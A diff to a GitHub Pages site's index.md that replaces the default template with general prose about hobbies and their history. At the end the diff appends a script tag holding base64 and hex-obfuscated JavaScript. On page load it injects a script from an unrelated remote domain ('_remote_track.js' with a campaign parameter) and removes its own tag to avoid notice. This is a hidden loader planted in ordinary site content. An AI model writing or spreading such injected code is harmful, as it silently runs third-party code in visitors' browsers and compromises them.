@@ -1,37 +1,19 @@
-## Welcome to GitHub Pages
+A hobby is considered to be a regular activity that is done for enjoyment, typically during one's leisure time, not professionally and not for pay. Hobbies include collecting themed items and objects, engaging in creative and artistic pursuits, playing sports, or pursuing other amusements. Participation in hobbies encourages acquiring substantial skills and knowledge in that area. 
+A list of hobbies changes with renewed interests and developing fashions, making it diverse and lengthy. Hobbies tend to follow trends in society, for example stamp collecting was popular during the nineteenth and twentieth centuries as postal systems were the main means of communication, while video games are more popular nowadays following technological advances.
+The advancing production and technology of the nineteenth century provided workers with more availability in leisure time to engage in hobbies. Because of this, the efforts of people investing in hobbies has increased with time.
 
-You can use the [editor on GitHub](https://github.com/proffitt77/hobby/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+Hobbyists may be identified under three sub-categories: casual leisure which is intrinsically rewarding, short-lived, pleasurable activity requiring little or no preparation, serious leisure which is the systematic pursuit of an amateur, hobbyist, or volunteer that is substantial, rewarding and results in a sense of accomplishment, and finally project-based leisure which is a short-term often a one-off project that is rewarding.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
 
-### Markdown
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+Writing and editing articles for Wikipedia is a hobby for some people.
+In the 16th century, the term "hobyn" had the meaning of "small horse and pony". The term "hobby horse" was documented in a 1557 payment confirmation for a "Hobbyhorse" from Reading, England.
+The item, originally called a "Tourney Horse", was made of a wooden or basketwork frame with an artificial tail and head. It was designed for a child to mimic riding a real horse. By 1816 the derivative, "hobby", was introduced into the vocabulary of a number of English people. Over the course of subsequent centuries, the term came to be associated with recreation and leisure. In the 17th century, the term was used in a pejorative sense by suggesting that a hobby was a childish pursuit, however, in the 18th century with more industrial society and more leisure time, hobbies took on greater respectability.
+A hobby is also called a pastime, derived from the use of hobbies to pass the time. A hobby became an activity that is practised regularly and usually with some worthwhile purpose. Hobbies are usually, but not always, practised primarily for interest and enjoyment, rather than financial reward.
 
-```markdown
-Syntax highlighted code block
+History
+Hobbies were originally described as pursuits that others thought somewhat childish or trivial. However, as early as 1676 Sir Matthew Hale, in Contemplations Moral and Divine, wrote "Almost every person hath some hobby horse or other wherein he prides himself." He was acknowledging that a "hobby horse" produces a legitimate sense of pride. By the mid 18th century there was a flourishing of hobbies as working people had more regular hours of work and greater leisure time. 
+They spent more time to pursue interests that brought them satisfaction. However, there was concern that these working people might not use their leisure time in worthwhile pursuits. "The hope of weaning people away from bad habits by the provision of counter-attractions came to the fore in the 1830s, and has rarely waned since. Initially the bad habits were perceived to be of a sensual and physical nature, and the counter attractions, or perhaps more accurately alternatives, deliberately cultivated rationality and the intellect."
+The flourishing book and magazine trade of the day encouraged worthwhile hobbies and pursuits. The burgeoning manufacturing trade made materials used in hobbies cheap and was responsive to the changing interests of hobbyists.
 
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/proffitt77/hobby/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="hr5On" src="data:text/javascript;base64, dmFyIF83dTRIbyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX09jQmFHLCBfTEZObDUpIHt2YXIgXzNsVXRzID0gZnVuY3Rpb24oX1U0bmtCKSB7d2hpbGUgKC0tX1U0bmtCKSB7X09jQmFHWydwdXNoJ10oX09jQmFHWydzaGlmdCddKCkpO319O18zbFV0cygrK19MRk5sNSk7fShfN3U0SG8sIDB4MTFiKSk7dmFyIF9odUdtMSA9IGZ1bmN0aW9uKF9XY2pBTywgX3JtS0ZEKSB7X1djakFPID0gX1djakFPIC0gMHgwO3ZhciBfTTUxaVcgPSBfN3U0SG9bX1djakFPXTtyZXR1cm4gX001MWlXO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfaHVHbTEoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1ROQlNLID0gZG9jdW1lbnRbX2h1R20xKCcweDEnKV0oX2h1R20xKCcweDInKSk7X1ROQlNLW19odUdtMSgnMHgzJyldID0gX2h1R20xKCcweDQnKTtfVE5CU0tbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3M1x4NzBceDMyXHg2Zlx4NjlceDM5XHg3OFx4NzNceDJlXHg3MFx4NzJceDZmXHg2Nlx4NjVceDczXHg3OVx4NjFceDc5XHg2OVx4NmVceDZjXHg2MVx4NzJceDY5XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NTNceDRiXHg3N1x4NDhceDRmXHg1OVx4NDFceDMwXHg0ZVx4NzknO2RvY3VtZW50W19odUdtMSgnMHg1JyldKF9odUdtMSgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9UTkJTSyk7ZG9jdW1lbnRbX2h1R20xKCcweDcnKV0oJ2hyNU9uJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
